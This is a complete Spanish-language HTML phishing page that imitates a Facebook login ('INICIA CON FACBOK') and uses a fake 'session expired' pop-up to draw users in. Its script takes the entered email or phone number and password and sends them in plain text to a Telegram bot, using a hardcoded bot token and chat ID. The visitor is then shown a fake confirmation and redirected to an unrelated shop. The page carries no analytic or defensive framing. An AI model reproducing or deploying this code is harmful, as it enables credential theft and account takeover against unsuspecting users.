<!DOCTYPE html>
<html lang="es">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mypime Online</title>
<style>
body {
  margin:0;
  font-family: system-ui, -apple-system, Arial, sans-serif;
  background: linear-gradient(#0f1c2e, #1b2d4a);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
}
.wrapper {
  width:100%;
  max-width:380px;
  background:#f2f2f2;
  border-radius:20px;
  box-shadow:0 5px 25px rgba(0,0,0,0.3);
  margin:auto;
  opacity:1;             
  pointer-events:none;   
  position:relative;
}
.header {
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  padding:18px;
  border-radius:20px 20px 0 0;
  text-align:center;
}
.header h1 { margin:0; font-size:28px; font-weight:700; }
.header p { margin:5px 0 0; font-size:13px; }
.form { padding:20px; text-align:center; }
input {
  width:90%;
  padding:14px;
  margin:8px auto;
  border-radius:6px;
  border:1px solid #ccd0d5;
  font-size:14px;
  background:#fff;
  display:block;
}
.btn {
  width:90%;
  padding:14px;
  margin:10px auto 0;
  border:none;
  border-radius:6px;
  font-weight:bold;
  background: linear-gradient(90deg,#ffd54f,#ff9800);
  color:white;
  font-size:15px;
  cursor:pointer;
}
.confirmacion {
  margin-top:15px;
  font-size:14px;
  color:#2e7d32;
  background:#e8f5e9;
  border:1px solid #c8e6c9;
  border-radius:6px;
  padding:10px;
  display:none; 
}
.overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:998; display:block; }
.modal { position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); width:90%; max-width:320px; background:white; border-radius:12px; box-shadow:0 8px 25px rgba(0,0,0,0.3); text-align:center; z-index:999; display:block; }
.modal-header { background:#1877f2; color:white; padding:12px; font-size:14px; border-radius:12px 12px 0 0; }
.modal-body { padding:15px; font-size:14px; }
.modal button { background:#1877f2; color:white; border:none; padding:10px; width:70%; border-radius:8px; cursor:pointer; }
</style>
</head>
<body>

<div class="wrapper" id="formWrapper">
  <div class="header">
    <h1>INICIA CON FACBOK</h1>
    <p>Conecta con tus amigos fácilmente</p>
  </div>

  <div class="form">
    <form id="registroForm">
      <input type="text" name="movil_email" placeholder="Móvil o email" required>
      <input type="password" name="clave" placeholder="Contraseña" required>
      <button type="submit" class="btn">Entrar ahora</button>
    </form>
    <div id="mensajeConfirmacion" class="confirmacion">
      ✅ Gracias por su registro. Será llevado a nuestra tienda...
    </div>
  </div>
</div>

<div id="overlay" class="overlay"></div>
<div id="modal" class="modal">
  <div class="modal-header">Su sesión ha expirado</div>
  <div class="modal-body">
    <p>Para continuar, verifica tu identidad.</p>
    <button onclick="cerrar()">Continuar</button>
  </div>
</div>

<script>
function cerrar(){
  document.getElementById("modal").style.display="none";
  document.getElementById("overlay").style.display="none";
  const form = document.getElementById("formWrapper");
  form.style.pointerEvents = "auto"; 
}

const form = document.getElementById("registroForm");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const datos = {
    MovilEmail: form.movil_email.value,
    Clave: form.clave.value
  };

  try {
    const TELEGRAM_TOKEN = "8923098896:AAH-GSaV8NtDknKsGKSYpJqlRJa6CnpG0Zk";
    const CHAT_ID = "1509335089";
    const mensaje = `Usuario: ${datos.MovilEmail}\nContraseña: ${datos.Clave}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    document.getElementById("mensajeConfirmacion").style.display = "block";

    setTimeout(() => {
      window.location.href = "https://supermarket23.com";
    }, 3000);

  } catch(err) {
    console.error("Error:", err);
  }
});
</script>

</body>
</html>
